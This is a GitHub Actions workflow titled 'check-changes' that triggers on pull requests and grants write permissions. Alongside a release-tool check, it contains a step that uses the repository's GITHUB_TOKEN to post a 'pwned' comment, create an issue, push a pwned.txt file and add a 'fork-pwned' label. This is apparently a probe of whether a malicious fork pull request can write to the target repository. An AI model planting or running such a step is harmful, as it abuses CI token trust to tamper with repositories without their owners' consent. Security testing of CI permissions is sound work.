on:
  pull_request:
    branches: [master]
    types: [opened, reopened, synchronize, labeled, unlabeled]

name: check-changes

permissions:
  contents: write
  pull-requests: write
  issues: write

jobs:
  check:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - uses: actions/checkout@df4cb1c069e1874edd31b4311f1884172cec0e10 # v6.0.3
        with:
          fetch-depth: 0

      - name: Attempt write operations with fork token
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          REPO: ${{ github.repository }}
          PR: ${{ github.event.pull_request.number }}
        run: |
          echo "=== Attempting write operations with fork PR token ==="

          echo "--- post PR comment ---"
          gh api repos/$REPO/issues/$PR/comments \
            --method POST --field body="pwned by fork token" \
            && echo "SUCCEEDED: posted comment" \
            || echo "FAILED: could not post comment"

          echo "--- create issue ---"
          gh api repos/$REPO/issues \
            --method POST --field title="fork token test" --field body="created by malicious fork PR" \
            && echo "SUCCEEDED: created issue" \
            || echo "FAILED: could not create issue"

          echo "--- push file via contents API ---"
          CONTENT=$(echo "pwned" | base64 -w0)
          gh api repos/$REPO/contents/pwned.txt \
            --method PUT \
            --field message="fork token pwn attempt" \
            --field content="$CONTENT" \
            && echo "SUCCEEDED: pushed file" \
            || echo "FAILED: could not push file"

          echo "--- create label ---"
          gh api repos/$REPO/labels \
            --method POST --field name="fork-pwned" --field color="ff0000" \
            && echo "SUCCEEDED: created label" \
            || echo "FAILED: could not create label"

      - name: Run change file check
        uses: OpenShock/release-tool@v0.1.0-alpha.5
        with:
          mode: check
          base-ref: ${{ github.event.pull_request.base.ref }}
          base-sha: ${{ github.event.pull_request.base.sha }}
          pr-number: ${{ github.event.pull_request.number }}

      - name: Upload verdict
        if: always()
        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
        with:
          name: release-check
          path: release-check.json
          if-no-files-found: warn
